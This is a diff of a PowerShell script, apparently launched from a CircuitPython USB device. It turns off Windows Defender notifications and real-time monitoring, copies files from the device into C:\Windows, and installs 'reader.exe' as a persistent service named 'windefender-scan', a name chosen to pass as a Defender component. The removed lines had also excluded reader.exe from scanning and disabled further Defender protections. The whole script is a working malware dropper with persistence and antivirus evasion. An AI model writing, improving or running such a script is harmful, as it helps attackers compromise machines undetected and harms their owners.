@@ -1,43 +1,79 @@
+# Define a log file
+$logFile = "C:\temp\script_log.txt"
+
+# Function to log messages to both console and log file
+function Log-Message {
+    param (
+        [string]$message
+    )
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logEntry = "$timestamp - $message"
+    Write-Host $logEntry
+    Add-Content -Path $logFile -Value $logEntry
+}
+
+# Log start of script
+Log-Message "Script started."
+
 # Disable Enhanced Notifications
-
-powershell -command 'Add-MpPreference -ExclusionPath "c:\temp" -ExclusionProcess "C:\Windows\reader.exe"'
-
-powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'
-
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" -Name DisableEnhancedNotifications -Value 1
+try {
+    Log-Message "Disabling Enhanced Notifications..."
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" -Name DisableEnhancedNotifications -Value 1
+    Log-Message "Enhanced Notifications disabled."
+} catch {
+    Log-Message "Error disabling Enhanced Notifications: $_"
+}
 
 # Disable Real-Time Monitoring
-Set-MpPreference -DisableRealtimeMonitoring $true
+try {
+    Log-Message "Disabling Real-Time Monitoring..."
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    Log-Message "Real-Time Monitoring disabled."
+} catch {
+    Log-Message "Error disabling Real-Time Monitoring: $_"
+}
 
 # Find the CIRCUITPY drive
+Log-Message "Searching for CIRCUITPY drive..."
 $driveLetter = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.VolumeName -eq "CIRCUITPY" } | Select-Object -ExpandProperty DeviceID
 
 if ($driveLetter) {
+    Log-Message "CIRCUITPY drive found: $driveLetter."
     $sourcePath = Join-Path $driveLetter "data"
     $destinationPath = "C:\Windows"
 
     # Check if the source path exists
     if (Test-Path $sourcePath) {
-        # Copy files from CIRCUITPY to the Windows folder
+        Log-Message "Source path exists: $sourcePath. Copying files..."
         Copy-Item -Path "$sourcePath\*" -Destination $destinationPath -Recurse -Force
+        Log-Message "Files copied to $destinationPath."
+        
         Set-Location -Path $destinationPath
 
         # Define NSSM path and service parameters
-        $nssmPath = Join-Path $destinationPath "nssm.exe"  # Assuming nssm.exe is copied to the Windows folder
+        $nssmPath = Join-Path $destinationPath "nssm.exe"
         $serviceName = "windefender-scan"
         $exePath = Join-Path $destinationPath "reader.exe"
 
-        # Check if NSSM and the reader.exe file exist
+        # Check if NSSM and reader.exe exist
         if ((Test-Path $nssmPath) -and (Test-Path $exePath)) {
-            # Install and start the service
-            & $nssmPath install $serviceName $exePath
-            & $nssmPath start $serviceName
+            Log-Message "nssm.exe and reader.exe found. Installing service..."
+            try {
+                & $nssmPath install $serviceName $exePath
+                & $nssmPath start $serviceName
+                Log-Message "Service installed and started successfully."
+            } catch {
+                Log-Message "Error installing or starting the service: $_"
+            }
         } else {
-            Write-Host "nssm.exe or reader.exe not found in the destination path."
+            Log-Message "Error: nssm.exe or reader.exe not found in $destinationPath."
         }
     } else {
-        Write-Host "Source folder 'data' not found on CIRCUITPY drive."
+        Log-Message "Error: Source folder 'data' not found on CIRCUITPY drive."
     }
 } else {
-    Write-Host "CIRCUITPY drive not found."
+    Log-Message "Error: CIRCUITPY drive not found."
 }
+
+# Log end of script
+Log-Message "Script completed."
